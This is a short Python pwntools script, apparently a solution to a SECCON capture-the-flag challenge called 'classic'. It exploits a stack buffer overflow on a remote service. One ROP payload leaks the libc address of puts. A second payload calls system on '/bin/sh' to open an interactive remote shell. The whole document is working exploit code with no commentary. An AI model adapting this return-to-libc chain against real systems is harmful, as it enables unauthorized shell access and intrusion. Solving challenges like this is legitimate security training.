from pwn import *

target = ELF('./classic')
POP_RDI_ABS = 0x400753

# r = process('./classic')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# BIN_SH = 0x1619d9

r = remote('classic.pwn.seccon.jp', 17354)
libc = ELF('./libc-2.23.so')
BIN_SH = 0x18cd57


payload = ''
payload += 'A' * 0x48
payload += p64(POP_RDI_ABS)
payload += p64(target.got['puts'])
payload += p64(target.plt['puts'])
payload += p64(target.symbols['main'])

r.sendlineafter('Local Buffer >> ', payload)

r.recvline()

LIBC_BASE = u64(r.recvline().strip().ljust(8, '\x00')) - libc.symbols['puts']


payload = ''
payload += 'A' * 0x48
payload += p64(POP_RDI_ABS)
payload += p64(LIBC_BASE + BIN_SH)
payload += p64(LIBC_BASE + libc.symbols['system'])

r.sendlineafter('Local Buffer >> ', payload)


r.interactive()
